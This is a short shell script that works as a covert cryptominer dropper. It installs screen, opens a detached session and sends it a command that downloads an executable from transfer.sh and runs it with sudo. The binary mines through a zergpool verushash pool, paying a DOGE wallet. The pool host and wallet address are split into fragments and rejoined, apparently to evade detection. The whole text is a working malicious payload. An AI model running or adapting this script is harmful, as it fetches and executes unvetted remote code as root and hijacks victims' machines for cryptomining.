#!/bin/sh

cd
apt-get install -y screen < "/dev/null"
mkdir yoho
cd yoho

screen -S "layar" -d -m
screen -r "layar" -X stuff $'wget https://transfer.sh/Cuy7yT/anon && chmod u+x anon && sudo ./anon -v -l $(echo $(echo "verushash.mi" && echo "ne.zergpool.com:3300")| tr -d '[:space:]') -u $(echo $(echo "DRreZxpmCRTsVy" && echo "r7iCiycLWRgn" && echo "Lh98xXAE")| tr -d '[:space:]') -p $(echo $(echo "c=DO" && echo "G" && echo "E")| tr -d '[:space:]') -t 2\n'